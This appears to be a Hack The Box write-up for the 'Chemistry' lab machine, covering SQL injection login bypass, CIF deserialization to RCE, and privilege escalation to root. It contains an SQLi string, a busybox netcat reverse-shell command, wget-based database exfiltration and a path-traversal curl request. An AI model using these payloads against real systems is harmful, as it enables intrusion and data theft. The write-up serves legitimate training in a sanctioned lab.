---
title: "HTB Writeup: Chemistry (Easy - Linux)"
date: 2025-03-15
tags: ["HackTheBox", "Linux", "Easy", "SQLi", "CIF", "Deserialization", "Hashcat", "PathTraversal"]
categories: ["HTB Writeups"]
description: "File upload bypass → RCE → privesc using LinPEAS findings"
showToc: true
---

## 🧪 Introduction

![Chemistry Logo](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/Chemistry.png)

This write-up walks through the Chemistry machine from Hack The Box. The box involves SQL injection, file upload exploitation with CIF parsing, reverse shell via object injection, and multiple privilege escalation paths.

{{< toolbadges "Nmap" "Hashcat" "SQLite3" "curl" "Netcat" "Python http.server" "busybox nc" >}}

---

## 🔓 SQL Injection Login Bypass

![Login Page](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/chemlogin.png)

The login form was vulnerable to SQL injection. Logging in with `' OR '1'='1' --` granted access to the dashboard.

---

## 📦 Malicious CIF Payload Upload

![CIF Payload](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/chemcifpayload.png)

We uploaded a crafted `.cif` file abusing Python object deserialization inside the `pymatgen` parser. The payload triggered a reverse shell.

---

## 📡 Reverse Shell Connected

![Netcat Connection](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/chemconnection.png)

Listener on port 9001 caught the reverse shell using `busybox nc <ip> <port> -e /bin/bash`. We gained a shell as user `app`.

---

## 🐍 Upgrading Shell & Enumerating

![Python Shell and Home Directory](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/chemhomedir.png)

Upgraded to a fully interactive shell with Python. Began exploring the application files and local SQLite database.

---

## 📤 Downloading database.db

![Python HTTP Server](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/chemserver.png)

Started a local HTTP server and used `wget --post-file` on the target to exfiltrate `database.db.1`.

![Downloaded DB File](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/chemdbfiledownload.png)

---

## 🗃️ Exploring SQLite Database

![Database Content](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/chemdbfilecontent.png)

Found multiple usernames and MD5 password hashes stored in the `user` table.

---

## 🔓 Cracking rosa's Hash

![Cracked rosa hash](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/chemhashcrack.png)

We cracked rosa's MD5 hash using `hashcat`, revealing a valid password.

---

## 🔑 SSH as rosa

![SSH into rosa](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/chemsshconnect.png)

Used the cracked credentials to SSH into the box as `rosa`. This provided access to internal services.

---

## 🔍 Enumerating Localhost Port 8080

![Enumeration of Localhost](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/chemenum.png)

From inside the rosa shell, we accessed a local Flask web service on `localhost:8080` which wasn't exposed externally.

---

## 🔑 SSH Key Discovery and Root Access

![SSH Private Key Found](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/chemsshrsa.png)

Found a private key file on the server and used it to SSH as root, gaining full access.

![Root Access](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/chempwned.png)

---

## 📬 Alternate Path to Root via curl

![Root.txt Retrieved via curl](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/chem2pwned.png)

From the `rosa` user shell, we used:

```bash
curl -s --path-as-is http://localhost:8080/assets/../../../root/root.txt
```

to read the `root.txt` file directly via path traversal.

---

## 📜 Lessons Learned

- SQL Injection for authentication bypass
- Abusing CIF parsing with Python object injection
- Creative use of busybox and netcat for reverse shell
- Privilege escalation via database exfiltration and SSH
- Internal service exploitation with path traversal

### ✅ Machine Completed: Chemistry

[BigKahunaBurger87 #192375](https://app.hackthebox.com/users/192375)
